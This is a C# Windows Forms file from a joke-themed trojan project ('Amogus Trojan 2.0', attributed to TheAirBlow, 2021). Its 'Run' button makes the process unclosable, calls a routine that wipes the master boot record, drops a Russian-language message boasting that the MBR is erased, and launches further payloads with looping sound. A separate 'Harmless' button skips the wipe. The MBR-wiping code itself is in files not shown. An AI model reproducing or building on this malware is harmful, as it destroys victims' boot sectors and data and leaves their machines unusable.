using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using UntitledTrojan2.Payloads;
using UntitledTrojan2.Properties;
using UntitledTrojan2.Tools;

namespace UntitledTrojan2
{
    public partial class Form1 : Form
    {
        public static bool Harmless = false;

        public Form1()
        {
            InitializeComponent();
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            // Run
            if (Failsafe.FailMain())
            {
                Harmless = false;
                Hide();
                Program.MakeUnclosable();
                MBR.FuckMBR();
                File.WriteAllText(@"C:\trash.txt", "Твой компьютер был заражен Amogus Trojan 2.0!\nДаже не пытайся его удалить, " +
                        "твой MBR уже был стёрт!\n\nСоздано TheAirBlow 2021 (https://vk.com/theairblow)");
                ProcessStartInfo info = new ProcessStartInfo();
                info.FileName = @"C:\Windows\notepad.exe";
                info.Arguments = @"C:\trash.txt";
                Process.Start(info);
                await Task.Delay(10000);
                SoundPlayer s = new SoundPlayer(Resources.amogus);
                s.PlayLooping();
                await PayloadsManager.Start();
            }
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            // Harmless
            Harmless = true;
            Hide();
            File.WriteAllText(@"C:\trash.txt", "Безопасная версия Amongus Trojan 2.0\n\nСоздано TheAirBlow 2021 (https://vk.com/theairblow)");
            ProcessStartInfo info = new ProcessStartInfo();
            info.FileName = @"C:\Windows\notepad.exe";
            info.Arguments = @"C:\trash.txt";
            Process.Start(info);
            await Task.Delay(10000);
            SoundPlayer s = new SoundPlayer(Resources.amogus);
            s.PlayLooping();
            await PayloadsManager.Start();
        }
    }
}
